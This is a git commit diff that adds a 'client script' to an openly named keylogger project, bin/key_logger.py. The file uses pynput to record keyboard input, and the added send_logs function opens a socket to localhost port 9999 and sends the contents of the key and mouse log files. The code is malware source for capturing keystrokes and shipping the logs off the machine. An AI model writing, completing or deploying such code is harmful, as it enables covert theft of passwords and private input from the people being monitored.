2da678666de5640e0f5b0ce0f218cda93d59fb83
Adisakshya Chauhan <45028982+adisakshya@users.noreply.github.com>
2019-03-09 13:57:12 +0530

    added client script

--- bin/key_logger.py
+++ bin/key_logger.py
@@ -1,6 +1,21 @@
 from pynput import keyboard
 import logging
 from client import send_logs
+import socket
+import sys
+
+files = ['key_log.txt', 'mouse_log.txt']
+
+def send_logs():
+    s = socket.socket()
+    s.connect(("localhost",9999))
+
+    for filename in files:
+        f = open (filename, "rb")
+        l = f.read(1024)
+        s.send(l)
+
+    s.close()
 
 log_dir = ""
 
